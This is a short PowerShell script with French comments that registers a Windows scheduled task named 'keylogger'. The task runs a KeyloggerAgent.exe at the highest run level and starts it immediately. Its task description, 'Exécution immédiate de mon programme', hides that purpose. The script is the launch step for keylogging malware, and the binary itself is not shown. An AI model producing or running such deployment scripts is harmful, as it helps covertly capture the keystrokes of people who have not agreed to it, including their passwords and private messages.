# Définir le chemin de l'exécutable et le nom de la tâche
$exePath = "C:\Temp\keylogger\KeyloggerAgent.exe"  # Remplacez par le chemin réel de votre .exe
$taskName = "keylogger"

# Récupérer l'utilisateur courant (vous pouvez spécifier un utilisateur si nécessaire)
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Créer un déclencheur pour la tâche (ici un déclencheur manuel qui lance la tâche immédiatement)
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(1)  # Lancer la tâche 1 seconde après la création

# Créer l'action pour exécuter votre fichier .exe
$action = New-ScheduledTaskAction -Execute $exePath

# Créer la tâche planifiée qui s'exécute sous l'utilisateur actuel
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description "Exécution immédiate de mon programme" -User $user -RunLevel Highest

# Lancer immédiatement la tâche planifiée
Start-ScheduledTask -TaskName $taskName
